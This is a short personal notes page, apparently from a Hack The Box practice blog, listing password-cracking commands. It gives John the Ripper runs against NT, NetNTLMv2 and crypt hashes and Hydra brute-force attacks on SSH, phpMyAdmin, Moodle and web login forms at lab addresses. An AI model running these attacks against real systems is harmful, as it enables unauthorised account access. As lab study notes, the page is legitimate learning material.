@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link href="https://fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet">
+
+        <title>passwords</title>
+
+        <link rel="stylesheet" href="/css/stylesheet.css">
+    </head>
+    <body>
+        <section id="page-title">
+            <h1><a href="/">Notes</a></h1>
+        </section>
+
+
+
+<section class="blog-post">
+    <h1>passwords</h1>
+    <div class="blog-post-subheader">
+        December 17, 2018
+    </div>
+    <div class="blog-post-content">
+        <p><pre><code>
+#john</p>
+
+<p>john &ndash;format=crypt &ndash;wordlist=rockyou.txt &ndash;session=two hashes.txt
+john &ndash;format=NT &ndash;rules -w=/usr/share/wordlists/rockyou.txt hashfile.txt<br />
+john &ndash;format=netntlmv2 hash.txt &ndash;wordlist=/usr/share/wordlists/rockyou.txt
+#hydra
+hydra -l admin docker.hackthebox.eu -s 44661 -P /usr/share/wordlists/rockyou.txt http-post-form &lsquo;/index.php:password=^PASS^:F=Invalid password!&rsquo;
+hydra -L users -P passwords 10.10.10.111 ssh
+hydra 10.10.10.153 http-post-form &ldquo;/moodle/login/index.php:username=^USER^&amp;password=^PASS^:F=Invalid login, please try again&rdquo; -l giovanni -P list -t 10 -w 30
+hash-identifier</p>
+
+<p>#hydra ssh
+<code><pre>hydra -l sammy -P rockyou.txt 10.10.10.76 -t 4 -s 22022 ssh</pre></code>
+#hydra phpmyadm
+<code><pre>hydra 10.10.10.1 -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/UserPassCombo-Jay.txt http-post-form &ldquo;/phpmyadmin/index.php:pma_username=^USER^&amp;pma_password=^PASS^&amp;server=1&amp;target=index.php&amp;token=570a7d8df35aeff09d15af220bced43d:F=Access denied&rdquo; -V</pre></code></p>
+
+<p>#create words list from site
+<code><pre>cewl wp.pl</pre></code>
+#convert to upper
+<code><pre>cat list | awk &lsquo;{print toupper($0)}&rsquo;</pre></code>
+#convert to lower
+<code><pre>cat list | awk &lsquo;{print tolower($0)}&rsquo;</pre></code></p>
+
+    </div>
+</section>
+
+    </body>
+</html>
